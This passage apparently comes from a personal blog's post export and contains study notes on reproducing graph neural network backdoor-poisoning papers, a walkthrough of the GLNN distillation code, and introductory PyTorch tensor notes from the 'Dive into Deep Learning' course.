[{"title":"一些论文复现","url":"/2023/08/30/23.09.05/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<p>​    \n    <div id=\"aplayer-dirqnGgO\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"1-backdoor-samples-generation\">1 backdoor samples generation</span></h1><p>首先要找到自己一个稳定而简单的可以生成glnn能够识别的backdoor samples。</p>\n<h2><span id=\"11-subgraph\">1.1 subgraph</span></h2><p>参考论文：Backdoor Attacks to Graph Neural Networks<br>对应代码<br><a href=\"https://github.com/zaixizhang/graphbackdoor\">https://github.com/zaixizhang/graphbackdoor</a></p>\n<h3><span id=\"111-复现\">1.1.1 复现</span></h3><p>将依赖存入 txt，然后<br>云gpu 预装的torch版本最好低于1.2，不然就会出现安装不了的尴尬情况，但是结果目测似乎与torch版本无关，总之就是都能跑。不过我这里直接用的torch 1.2.0.<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install -r xx.txt</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">matplotlib==3.1.1</span><br><span class=\"line\">numpy==1.17.1</span><br><span class=\"line\">torch==1.2.0</span><br><span class=\"line\">scipy==1.3.1</span><br><span class=\"line\">networkx==2.4</span><br><span class=\"line\">tqdm==4.47.0</span><br><span class=\"line\">pickle==0.7.5</span><br><span class=\"line\">scikit-learn</span><br></pre></td></tr></table></figure>\n<p> ps：显示sklearn缺失请：<br> <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install -U scikit-learn</span><br></pre></td></tr></table></figure><br>pickle显示无法安装直接忽略，它本身就是python的一个包，不需要另外安装，版本什么的目测无所谓。</p>\n<p>这个代码写得很抽象，要把这些存中间文件或者结果的文件夹手动创建一遍，不然会报错，我不知道是我的bug还是写代码的人的问题。我感觉是他的问题。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-02%20at%205.29.18%20PM.png\" alt=\"Screen Shot 2023-09-02 at 5.29.18 PM\"><br>把该mkdir的文件夹建好一键执行shell就可以开跑。2080ti 100个epoch大概要跑三分钟。<br>每五个epoch会给出test的acc，两行分别是GCN和GIN的结果（），可以看到达到惊人的95%<br>这样下来这边的backdoor attack算是成功的。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-02%20at%205.28.41%20PM.png\" alt=\"Screen Shot 2023-09-02 at 5.28.41 PM\"></p>\n<h3><span id=\"112-代码\">1.1.2 代码</span></h3><h4><span id=\"backdoor_graph_generation_random\">backdoor_graph_generation_random</span></h4><p>函数将图分为了大致四个类型</p>\n<p>简要写一个对于代码的分析。。<br><code>main_backdoor.py</code>主要就是训练的框架，是个machine learning的code都大差不差。真正有用的函数都在<code>util.py</code>里。</p>\n<h4><span id=\"mainpy\">main.py</span></h4><h4><span id=\"utilpy\">util.py</span></h4><h3><span id=\"113-问题\">1.1.3 问题</span></h3><p>这个代码用的数据集是没有经过处理的原始txt 文件，并不是很能与glnn适配。<br>——》去论文里看一下用的数据集的介绍，然后看看这个数据集能不能经过处理之后apply到glnn上。</p>\n<h2><span id=\"12-ugba\">1.2 UGBA</span></h2><h3><span id=\"121-复现\">1.2.1 复现</span></h3><p>环境配了好久，但是code有bug无法复现。。。</p>\n<p>trigger generation阶段直接保存samples to npz。<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">torch.save(&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;poison_x&#x27;</span>: poison_x,</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;poison_edge_index&#x27;</span>: poison_edge_index,</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;poison_edge_weights&#x27;</span>: poison_edge_weights,</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;poison_labels&#x27;</span>: poison_labels</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;, <span class=\"string\">&#x27;./backdoor_samples.pth&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"13-backdoor2\">1.3 backdoor2</span></h2><p>pip install dgl-cu101 -f <a href=\"https://data.dgl.ai/wheels/repo.html\">https://data.dgl.ai/wheels/repo.html</a></p>\n<h3><span id=\"131-复现\">1.3.1 复现</span></h3><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-05%20at%203.29.42%20AM.png\" alt=\"Screen Shot 2023-09-05 at 3.29.42 AM\"></p>\n<h3><span id=\"132-code\">1.3.2 code</span></h3><h1><span id=\"2-glnn\">2 GLNN</span></h1><p>然后来尝试跑一下GLNN的code。</p>\n<h2><span id=\"21-train\">2.1 train</span></h2><p>先下好数据集，然后建文件夹</p>\n<p>数据集介绍<br>glnn使用的数据集是<code>cora.npz</code><br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-04%20at%203.22.37%20PM.png\" alt=\"Screen Shot 2023-09-04 at 3.22.37 PM\"></p>\n<ol>\n<li><p><strong>adj_data, adj_indices, adj_indptr, adj_shape</strong>:<br>These arrays represent the adjacency matrix of the graph in the Compressed Sparse Row (CSR) format. In CSR format:</p>\n<ul>\n<li><code>adj_data</code>: Contains the non-zero values of the matrix.</li>\n<li><code>adj_indices</code>: Contains the column indices for each non-zero value.</li>\n<li><code>adj_indptr</code>: Contains the index in <code>adj_data</code> where each row starts.</li>\n<li><code>adj_shape</code>: Specifies the shape of the adjacency matrix.</li>\n</ul>\n<p>Together, these arrays allow you to reconstruct the adjacency matrix of the graph efficiently, especially when the graph is sparse.</p>\n</li>\n<li><p><strong>attr_data, attr_indices, attr_indptr, attr_shape</strong>:<br>These arrays represent the node attribute matrix in the CSR format, similar to the adjacency matrix. The node attribute matrix specifies features or attributes for each node in the graph.</p>\n<ul>\n<li><code>attr_data</code>: Contains the non-zero values of the node attribute matrix.</li>\n<li><code>attr_indices</code>: Contains the column indices for each non-zero value in the attribute matrix.</li>\n<li><code>attr_indptr</code>: Contains the index in <code>attr_data</code> where each row of the attribute matrix starts.</li>\n<li><code>attr_shape</code>: Specifies the shape of the node attribute matrix.</li>\n</ul>\n</li>\n<li><p><strong>labels</strong>:<br>This array contains the labels or classes for each node in the graph. It’s typically used in node classification tasks.</p>\n</li>\n<li><p><strong>node_names</strong>:<br>This array contains the names or identifiers for each node in the graph. It helps in mapping the nodes to their corresponding attributes, labels, and positions in the adjacency matrix.</p>\n</li>\n<li><p><strong>class_names</strong>:<br>This array contains the names or identifiers for each class or label in the dataset. It helps in understanding the meaning or context of each label in the <code>labels</code> array.</p>\n</li>\n</ol>\n<p>In summary, these arrays provide a comprehensive representation of a graph, including its structure (adjacency matrix), node attributes, node labels, and other metadata.</p>\n<p>而ugba使用的则是pyg库处理的数据集。</p>\n<p><a href=\"https://blog.csdn.net/weixin_45928096/article/details/126910291\">https://blog.csdn.net/weixin_45928096/article/details/126910291</a></p>\n<p>格式大概是<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">Data(x, edge_index, edge_attr, y）</span><br></pre></td></tr></table></figure></p>\n<h4><span id=\"idea\">idea</span></h4><p> 以transductive mode为例，训练一个model需要的data至少有</p>\n<ol>\n<li>graph（用adj+包生成）</li>\n<li>feats（adj, features, labels = data.unpack()）</li>\n<li>label（unpack，binarize）</li>\n<li>idx（idx_train, idx_val, idx_test）（get_train_val_test_split</li>\n</ol>\n<p>这个用的是transductive模式<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">python train_teacher.py --exp_setting tran --teacher GCN --dataset cora</span><br></pre></td></tr></table></figure><br>这个基本秒出结果</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-03%20at%2012.21.32%20AM.png\" alt=\"Screen Shot 2023-09-03 at 12.21.32 AM\"></p>\n<p>随便试了一些模型和数据集，基本上能和论文给出的实验数据对上。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-03%20at%2012.22.42%20AM.png\" alt=\"Screen Shot 2023-09-03 at 12.22.42 AM\"></p>\n<p>训练出来的teacher model就在这个路径下，可以看到刚才训练了三个数据集都分别有。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-03%20at%2012.27.17%20AM.png\" alt=\"Screen Shot 2023-09-03 at 12.27.17 AM\"></p>\n<p>训练student模型使用了inductive mode，其实本质上和tran没有太大的区别，只是让mlp的泛化能力更强一些。<br><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">python train_student.py --exp_setting tran --teacher GCN --student MLP --dataset cora --out_t_path  ./outputs/transductive/cora/GCN/seed_0/out.npz</span><br></pre></td></tr></table></figure></p>\n<p>参数之类的比较清晰。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-02%20at%209.19.12%20PM.png\" alt=\"Screen Shot 2023-09-02 at 9.19.12 PM\"></p>\n<h2><span id=\"22-code\">2.2 code</span></h2><p>由于该项目差不多是整个实验的大框架，所以这里详细分析一下。<br>即以运行的顺序对不熟悉的函数进行功能性分析。<br>通过该代码分析需要理解：</p>\n<ol>\n<li>原始的kd如何通过代码实现</li>\n<li>glnn又是如何实现<h3><span id=\"train-teacherpy\">train teacher.py</span></h3>首先我们需要train一个teacher model<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python train_teacher.py --exp_setting tran --teacher GCN --dataset cora</span><br></pre></td></tr></table></figure>\n这里指定了训练模式是transduction，被训练的model是GCN，用的cora数据集。<h4><span id=\"概念\">概念</span></h4>首先有一个transduction 和 Inductive mode.<br>transduction 指的是stu model预测的是原本的graph？<br>induction指的是stu 能够预测新的graph？</li>\n</ol>\n<h4><span id=\"import\">import</span></h4><p>没有什么特别值得注意的地方<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> torch.optim <span class=\"keyword\">as</span> optim</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pathlib <span class=\"keyword\">import</span> Path</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> models <span class=\"keyword\">import</span> Model</span><br><span class=\"line\"><span class=\"comment\"># 导入models.py 定义的 Model类，其中又包含几个重要模型的类</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> dataloader <span class=\"keyword\">import</span> load_data</span><br><span class=\"line\"><span class=\"keyword\">from</span> utils <span class=\"keyword\">import</span> (</span><br><span class=\"line\"></span><br><span class=\"line\">get_logger,</span><br><span class=\"line\"></span><br><span class=\"line\">get_evaluator,</span><br><span class=\"line\"></span><br><span class=\"line\">set_seed,</span><br><span class=\"line\"></span><br><span class=\"line\">get_training_config,</span><br><span class=\"line\"></span><br><span class=\"line\">check_writable,</span><br><span class=\"line\"></span><br><span class=\"line\">compute_min_cut_loss,</span><br><span class=\"line\"></span><br><span class=\"line\">graph_split,</span><br><span class=\"line\"></span><br><span class=\"line\">feature_prop,</span><br><span class=\"line\"></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> train_and_eval <span class=\"keyword\">import</span> run_transductive, run_inductive</span><br></pre></td></tr></table></figure></p>\n<h4><span id=\"main\">main</span></h4><p>先大致梳理一遍流程，具体的函数会在后文详细分析<br>首先获取所有命令行参数。<br>根据<code>num_exp</code>来判断<code>run</code>函数需要执行多少次。<br>一次就调用一遍<code>run</code>，多次就调用<code>repeat_run</code>，并分别返回score或score与其标准差。<br>然后将score从数组的float类型转换为string类型并打印输出以及保存在<code>exp_results</code>文件中。<br>然后我们根据main的调用顺序依次分析被调函数。</p>\n<h4><span id=\"get-args\">get args()</span></h4><p>基本上整个函数都是用<code>argparse</code>模块来从命令行获取函数运行时的参数。简单来说就是自定义一些命令行的可选参数使得脚本执行的时候更直观方便地直接在命令行中控制参数。<br>这个函数定义了很多参数，但是example中实际执行时需要规定的并不多，基本都是默认值，比较重要的需要用户自定义的例如 <code>exp setting</code><br>内容没有必要细看，需要的时候对照查找就好。<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">parser.add_argument(</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;--exp_setting&quot;</span>,</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">type</span>=<span class=\"built_in\">str</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">default=<span class=\"string\">&quot;tran&quot;</span>,</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">help</span>=<span class=\"string\">&quot;Experiment setting, one of [tran, ind]&quot;</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure></p>\n<h4><span id=\"run\">run()</span></h4><p>也是最关键的函数。</p>\n<h5><span id=\"return\">return</span></h5><p>首先注释说明了返回值是测试集的评估分数。<br>且<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">len(score_lst) = 1 for the transductive setting.</span><br><span class=\"line\">len(score_lst) = 2 for the inductive/production setting.</span><br></pre></td></tr></table></figure></p>\n<h5><span id=\"set_seed\">set_seed</span></h5><p>函数参数通过<code>args.seed</code>获取。<br>主要功能就是获取随机种子，其中会根据device是cpu或gpu进行一些调整。</p>\n<h5><span id=\"获取device\">获取device</span></h5><p>接着检查gpu状态，如果有则设置device为cuda。</p>\n<h5><span id=\"创建文件夹\">创建文件夹</span></h5><p>根据指定的模式创建对应路径的输出文件所在的文件夹。<br>    如果选择的是tran，则在指定路径下创建相对应的指定名称的文件夹，ind同理，但是文件夹名称会多出<code>split_rate</code>参数，具体功能在后面说明。</p>\n<h5><span id=\"检测输出文件夹状态\">检测输出文件夹状态</span></h5><p>接着大致检查一下输出文件夹是否可写，如果没什么问题就在终端输出文件夹对应路径。</p>\n<h5><span id=\"load-data\">load data</span></h5><p>首先是调用了<code>dataloader.py</code>定义的<code>load_data</code>函数。<br>简单来说就是根据dataset的不同，又进入不同的特定的数据加载函数中，例如cpf数据集调用了<code>load_cpf_data</code><br>读取数据部分，调用的是<code>load_npz_to_sparse_graph(data_path)</code>,将返回值赋给data。<br><code>load_npz_to_sparse_graph(data_path)</code>大概将就是读取npz的一些arrays，然后把arrays储存到各种对应的变量中。</p>\n<p>接下来就是对读入的raw data的一些简单的处理。</p>\n<h6><span id=\"standardize\">standardize()</span></h6><p>removing self-loops and extracting the largest connected component using the <code>standardize</code> method.</p>\n<h6><span id=\"unpack\">unpack()</span></h6><p>默认的方法。</p>\n<ul>\n<li>The adjacency matrix (<code>adj</code>), node features (<code>features</code>), and labels (<code>labels</code>) are then unpacked from the data.<h6><span id=\"binarize_labelslabels\">binarize_labels(labels)</span></h6>converts multi-class labels into a one-hot encoded format.</li>\n</ul>\n<p>然后将刚刚处理的一些数据从sparse matrix format 转为 a dense numpy array继而转为tensor，包括g, labels, idx_train, idx_val, idx_test。<br>其中<code>g = dgl.graph((adj_sp.row, adj_sp.col))</code>是利用dgl包根据领接矩阵生成的图。<br>数据加载完成之后，打印加载的情况，例如有多少节点和边，feature和label的维度等。因为之前已经生成好graph了，所以获取这类信息只需要调用<code>.number_of_nodes()</code>等方法。</p>\n<h5><span id=\"model初始化\">model初始化</span></h5><p>然后初始化model的一些参数，例如设备，优化器，损失函数等等。这里比较常规就不展开说。</p>\n<p>各类初始化工作完成之后就进入训练过程。</p>\n<h5><span id=\"data-split-and-run\">Data split and run</span></h5><p>首先如果是选择tran模式，实际调用了<code>run_transductive()</code>。这个函数也是根据模型的不同有不同的操作‘。<br>首先确定indices有三种，test，train和val。<br>然后传递参数进入run_transductive()。</p>\n<p>开头还是基本的初始化。接着根据model选择的不同分为三种情况：sage，mlp和其他。<br>例如mode name是gcn，那么直接调用train函数，返回loss。（Input the entire graph <code>g</code> as data.）<br>后面的criterion等也比较常规，接着就是每五轮评估一次，然后输出最好的acc。</p>\n<p>ind模式其实就是在数据集中多加了一个obs g（就是利用已有的graph生成的新graph）</p>\n<h5><span id=\"结果输出amp保存\">结果输出&amp;保存</span></h5><p>out 储存了model的分类结果。<br>同时可以保存model的参数。</p>\n<h3><span id=\"train-studentpy\">train student.py</span></h3><p>整体和teacher是差不多的，比较关键的在于输入的数据到底是个啥，<br>但是如果只是从代码能不能跑的角度，只要teacher train有output.npz，student model理论上就能够train动。<br>就看一眼<code>distill_run_transductive</code>函数<br>他其实就是用了teacher model的输出作为一部分feature<br>训练的过程也就是一个mlp，比较简单。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-09-03%20at%201.01.33%20AM.png\" alt=\"Screen Shot 2023-09-03 at 1.01.33 AM\"></p>\n","categories":["ML"],"tags":["GNN"]},{"title":"01_preparation","url":"/2023/03/07/D2L_001_preparation/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-YbBiPyXm\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"0-preface\">0) Preface</span></h2><p>Just a few days ago I was wondering why Linus is one of the most famous Stoics. But everything is so clear that the “linux system”,representing for the opening-source spirit,which is definitely a preeminent concentration of the essence for Stoicism,with its pure pursuit for teconology liberty and Human progressing.</p>\n<p>So the similar thing just happened as I recently found a website called “dive in to deep learning”, equipped with the well-rounded documents within the filed of machine (deep) learning, and combined the mathmatical principles with the excuatable codes and detailed descriptions. I was hit by the truth that  I just had learned some of the courses produced by one of the document authors, whose name is Mu,Li.</p>\n<p>Maybe the most desireable thing for the authors is that everyone can value this series of lectures , so Do I.</p>\n<h2><span id=\"1-installation\">1) Installation</span></h2><h3><span id=\"miniconda\">miniconda</span></h3><p>Download and excute the pkg in the official website <a href=\"https://conda.io/en/latest/miniconda.html\">https://conda.io/en/latest/miniconda.html</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">/Users/rin/miniconda3/<span class=\"built_in\">bin</span> conda create --name d2l python=<span class=\"number\">3.9</span> -y\\n</span><br><span class=\"line\">/Users/rin/miniconda3/<span class=\"built_in\">bin</span> conda activate d2l</span><br></pre></td></tr></table></figure>\n<h4><span id=\"pytorch\">pytorch</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install torch==<span class=\"number\">1.12</span><span class=\"number\">.0</span> torchvision==<span class=\"number\">0.13</span><span class=\"number\">.0</span></span><br><span class=\"line\">pip install d2l==<span class=\"number\">1.0</span><span class=\"number\">.0</span>b0</span><br></pre></td></tr></table></figure>\n<h2><span id=\"2-overview-of-deep-learning\">2) overview of deep learning</span></h2><h3><span id=\"key-components\">key components</span></h3><h5><span id=\"data\">data</span></h5><ol>\n<li>more datas as possible</li>\n<li>right data with not too many errors</li>\n</ol>\n<h5><span id=\"model\">model</span></h5><h5><span id=\"objective-functions\">objective functions</span></h5><p>function to judge the quality of the model.</p>\n<h5><span id=\"optimization-algorithms\">optimization algorithms</span></h5><p>algorithm to optimize the objective functions, rendering a better performance of the model.</p>\n<h3><span id=\"types-of-ml\">types of ML</span></h3><h5><span id=\"supervised-learning\">supervised learning</span></h5><p>Input of feature is labeled manually,then system output its prediction for a new unlabeled input.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-09%20at%208.03.18%20PM.png\" alt=\"Screen Shot 2023-03-09 at 8.03.18 PM\"></p>\n<ol>\n<li><p><strong>Regression</strong></p>\n</li>\n<li><h4><span id=\"classification\">Classification</span></h4></li>\n<li><h4><span id=\"taggingmulti-label-classification\">Tagging—<em>multi-label classification</em></span></h4></li>\n<li><h4><span id=\"searchwhich-solutions-should-be-put-priorly\">Search—which solutions should be put priorly.</span></h4></li>\n<li><h4><span id=\"recommender-systems\">Recommender Systems</span></h4></li>\n<li><h4><span id=\"sequence-learning\">Sequence Learning</span></h4></li>\n</ol>\n<h5><span id=\"unsupervised-and-self-supervised-learning\">Unsupervised and Self-Supervised Learning</span></h5><p>NO exact ideas what should to do with the dataset.</p>\n<p><strong><em>self-supervised learning</em></strong></p>\n<p>leverage the unlabeled data to provide supervision.</p>\n","categories":["ML"],"tags":["d2l"]},{"title":"02_data_manipulation","url":"/2023/03/08/D2L_002_data_preprocessing/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-artaIect\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>\n<p>obsidian://open?vault=_posts&amp;file=D2L_001_preparation</p>\n<h2><span id=\"data_manuipation\">data_manuipation</span></h2><h3><span id=\"i-using-pytorch-to-create-the-first-tensor\">i)    Using pytorch to create the first tensor</span></h3><h5><span id=\"arange\">arange</span></h5><p>PyTorch provides a variety of functions for creating new tensors prepopulated with values.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x = torch.arange(<span class=\"number\">12</span>, dtype=torch.float32)</span><br><span class=\"line\"><span class=\"comment\">#generate tensor with numbers within 0-12</span></span><br><span class=\"line\">x</span><br><span class=\"line\"><span class=\"comment\">#Out[2]: tensor([ 0.,  1.,  2.,  3.,  4.,  5.,  6.,  7.,  8.,  9., 10., 11.])</span></span><br></pre></td></tr></table></figure>\n<p>tensor can be considered as a expand of array in dimension, take arrays for instance, they are usually two dimensions , so if we want to present the data as three ,four, even deeper of dimensions, we just indify the tensor to describe them.</p>\n<h5><span id=\"numel\">numel</span></h5><p>Inspect the total number of elements in a tensor via its <code>numel</code> method. </p>\n<h5><span id=\"shape\">shape</span></h5><p>Inspec shape via <code>shape</code> method.</p>\n<h5><span id=\"reshape\">reshape</span></h5><p><code>reshape(row,col)</code> the tensor,containg 3 new arrays element with 4 numbers inside each of the array.—&gt;3X4 metrics</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-10%20at%2010.13.54%20AM.png\" alt=\"Screen Shot 2023-03-10 at 10.13.54 AM\"></p>\n<h5><span id=\"zerosampones\">zeros&amp;ones</span></h5><p>deriving the same idea as generating a zero valued M *N metric by <code>torch.zeros((2, 3, 4))</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">torch.zeros((<span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tensor([[[0., 0., 0., 0.],</span></span><br><span class=\"line\"><span class=\"string\">         [0., 0., 0., 0.],</span></span><br><span class=\"line\"><span class=\"string\">         [0., 0., 0., 0.]],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        [[0., 0., 0., 0.],</span></span><br><span class=\"line\"><span class=\"string\">         [0., 0., 0., 0.],</span></span><br><span class=\"line\"><span class=\"string\">         [0., 0., 0., 0.]]])</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">torch.ones((<span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tensor([[[1., 1., 1., 1.],</span></span><br><span class=\"line\"><span class=\"string\">         [1., 1., 1., 1.],</span></span><br><span class=\"line\"><span class=\"string\">         [1., 1., 1., 1.]],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        [[1., 1., 1., 1.],</span></span><br><span class=\"line\"><span class=\"string\">         [1., 1., 1., 1.],</span></span><br><span class=\"line\"><span class=\"string\">         [1., 1., 1., 1.]]])</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<h5><span id=\"randn\">randn</span></h5><p>generating the 3x4 tensor randomly</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">torch.randn(<span class=\"number\">3</span>, <span class=\"number\">4</span>)</span><br></pre></td></tr></table></figure>\n<h5><span id=\"tensor\">tensor</span></h5><p>Generating tensor directly with explicit values.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">torch.tensor([[<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>], [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>], [<span class=\"number\">4</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>]])</span><br></pre></td></tr></table></figure>\n<h3><span id=\"operation-of-tensor\">operation of tensor</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x = torch.tensor([<span class=\"number\">1.0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>])</span><br><span class=\"line\">y = torch.tensor([<span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>])</span><br><span class=\"line\">x + y, x - y, x * y, x / y, x ** y</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">(tensor([ 3.,  4.,  6., 10.]),</span></span><br><span class=\"line\"><span class=\"string\"> tensor([-1.,  0.,  2.,  6.]),</span></span><br><span class=\"line\"><span class=\"string\"> tensor([ 2.,  4.,  8., 16.]),</span></span><br><span class=\"line\"><span class=\"string\"> tensor([0.5000, 1.0000, 2.0000, 4.0000]),</span></span><br><span class=\"line\"><span class=\"string\"> tensor([ 1.,  4., 16., 64.]))&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>tensors can be easily caculated via some simple operations.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">X = torch.arange(<span class=\"number\">12</span>, dtype=torch.float32).reshape((<span class=\"number\">3</span>,<span class=\"number\">4</span>))</span><br><span class=\"line\">Y = torch.tensor([[<span class=\"number\">2.0</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>], [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>], [<span class=\"number\">4</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>]])</span><br><span class=\"line\">torch.cat((X, Y), dim=<span class=\"number\">0</span>), torch.cat((X, Y), dim=<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;(tensor([[ 0.,  1.,  2.,  3.],</span></span><br><span class=\"line\"><span class=\"string\">         [ 4.,  5.,  6.,  7.],</span></span><br><span class=\"line\"><span class=\"string\">         [ 8.,  9., 10., 11.],</span></span><br><span class=\"line\"><span class=\"string\">         [ 2.,  1.,  4.,  3.],</span></span><br><span class=\"line\"><span class=\"string\">         [ 1.,  2.,  3.,  4.],</span></span><br><span class=\"line\"><span class=\"string\">         [ 4.,  3.,  2.,  1.]]),</span></span><br><span class=\"line\"><span class=\"string\"> tensor([[ 0.,  1.,  2.,  3.,  2.,  1.,  4.,  3.],</span></span><br><span class=\"line\"><span class=\"string\">         [ 4.,  5.,  6.,  7.,  1.,  2.,  3.,  4.],</span></span><br><span class=\"line\"><span class=\"string\">         [ 8.,  9., 10., 11.,  4.,  3.,  2.,  1.]]))</span></span><br><span class=\"line\"><span class=\"string\">         &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><code>cat</code> means we combine two of the tensor ,<code>dim</code> indicates the location the tensor should be 